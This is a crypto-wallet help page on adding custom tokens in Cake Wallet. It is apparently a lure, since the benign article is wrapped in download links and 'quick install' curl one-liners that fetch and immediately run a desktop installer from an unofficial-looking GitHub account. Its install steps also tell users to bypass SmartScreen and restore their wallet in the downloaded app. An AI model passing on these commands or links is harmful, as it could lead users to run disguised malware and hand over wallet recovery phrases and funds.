![Cake Wallet custom tokens guide](assets/cake-wallet-custom-tokens-article-banner.png)

# Add Custom Tokens in Cake Wallet

Why a transfer arrived and the balance still shows nothing.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Open the network the token lives on, choose add custom token, and paste the contract address. The token then appears with the balance the address already holds. A token on another network needs adding there separately, and a wrong contract shows a token that is not yours.

<!-- ARTICLE-BODY-BEGIN -->

## Why a token is invisible
A chain knows its native coin; tokens are separate contracts that the wallet has to be told about. That is why ETH appears immediately and a new token does not, even when the transfer succeeded.

The funds were never missing. The wallet was showing the network's coin and not the token list, which is a display gap rather than a transfer problem.

## Adding it
Choose the network first, then the add-token option, and paste the contract address. The wallet fills in the symbol and decimals from the contract, and you confirm.

Get the contract from the issuer or an explorer, not from a search result that may have been set up for the purpose. A wrong contract produces a token entry that shows a zero balance and no relation to your transfer.

## Tokens on other networks
The same symbol exists on several chains as unrelated contracts. USDT on Tron and USDT on Ethereum need adding on each network, and adding one does not reveal the other.

That is also why a bridged balance can look absent. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-usdt-bridge.md">Bridge USDT between chains</a> explains the destination side, where the token usually needs adding before the bridged amount appears.

## Balance still wrong after adding it
If the token is added on the right network with the right contract and the balance is still zero, the transfer did not land at this address. Check the transaction on an explorer before doing anything else.

A token added on the wrong network is the most common false negative. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-supported-coins-networks.md">Cake Wallet supported coins</a> lists which networks are in scope, so you can confirm the chain is supported before chasing the contract.

## Tokens and the rest of the wallet
A token balance is spendable like the network's coin, but fees are paid in the native coin: you need ETH to move an ERC-20 token, and TRX to move a TRC-20 token. An empty native balance makes a funded token unspendable.

That is the cause of most "insufficient gas" errors, which look like a token problem and are a fee problem.

## Current build
Token handling and the supported network list change between releases, so install the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">latest Cake Wallet release</a> before concluding that a network is unsupported.

If a network is missing from the list entirely, the build is the reason rather than the token. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-funds-not-appearing.md">Funds not appearing in Cake Wallet</a> covers the remaining checks in order if the balance still disagrees.

## FAQ
### How do I add a custom token?
Pick the network, choose add token, paste the contract address, and confirm the details it fills in.
### Why is my token not showing?
It was never added on that network, or it was added with the wrong contract or on a different chain.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[Cake Wallet supported coins](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-supported-coins-networks.md) · [bridge USDT between chains](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-usdt-bridge.md) · [funds not appearing in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-funds-not-appearing.md) · [latest Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
